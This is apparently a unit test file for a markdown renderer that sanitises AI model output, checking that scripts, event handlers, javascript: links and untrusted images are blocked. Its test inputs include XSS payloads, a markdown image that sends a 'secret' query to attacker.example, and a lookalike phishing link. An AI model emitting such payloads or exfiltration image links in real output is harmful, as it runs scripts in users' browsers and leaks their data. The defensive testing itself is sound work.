import { imageGate, originGate, renderMarkdown } from '../src/render';

describe('renderMarkdown', () => {
  it('renders markdown', () => {
    expect(renderMarkdown('**bold**')).toContain('<strong>bold</strong>');
  });

  it('strips scripts and event handlers from model output', () => {
    const html = renderMarkdown('<script>alert(1)</script><img src=x onerror="alert(1)">');

    expect(html).not.toContain('<script');
    expect(html).not.toContain('onerror');
  });

  it('strips javascript: URLs from markdown and raw HTML links', () => {
    const fromMarkdown = renderMarkdown('[click](javascript:alert(1))');
    const fromHtml = renderMarkdown('<a href="javascript:alert(1)">click</a>');

    expect(fromMarkdown).not.toMatch(/href="javascript:/i);
    expect(fromHtml).not.toMatch(/href="javascript:/i);
  });

  it('loads images only from the host page and allowed origins', () => {
    const gate = imageGate(['https://qhse-mcp.example.com'], 'https://erp.example.com/app/');

    expect(gate('/api/gaith/files/a1')).toBe(true); // host's own origin
    expect(gate('https://qhse-mcp.example.com/files/ticket')).toBe(true);
    expect(gate('https://attacker.example/pixel.png?q=secret')).toBe(false);
    expect(gate('data:image/png;base64,AAAA')).toBe(false);
  });

  it('does not load a blocked image, but shows where it points', () => {
    const html = renderMarkdown('![leak](https://attacker.example/x.png?q=secret)', () => false);

    expect(html).not.toContain('<img');
    expect(html).toContain('leak (https://attacker.example/x.png?q=secret)');
  });

  it('keeps links to allowed addresses clickable and shows any other link as text with its address', () => {
    const links = originGate(['https://qhse-mcp.example.com'], 'https://qhse.example.com/app/');
    const html = renderMarkdown(
      '[report](/reports/7) [tool](https://qhse-mcp.example.com/files/1) [pay here](https://qhse.example.com.evil.test/login)',
      () => false,
      links
    );

    expect(html).toContain('href="/reports/7"'); // the product's own pages
    expect(html).toContain('href="https://qhse-mcp.example.com/files/1"');
    expect(html).not.toContain('evil.test/login"');
    expect(html).toContain('pay here (https://qhse.example.com.evil.test/login)');
  });

  it('keeps allowed images and loads them without sending a referrer', () => {
    const html = renderMarkdown('![photo](https://qhse-mcp.example.com/files/t1)', () => true);

    expect(html).toContain('<img');
    expect(html).toContain('referrerpolicy="no-referrer"');
  });

  it('opens links in a new tab without access to the host page', () => {
    const html = renderMarkdown('[docs](https://example.com)', () => false, () => true);

    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
  });
});
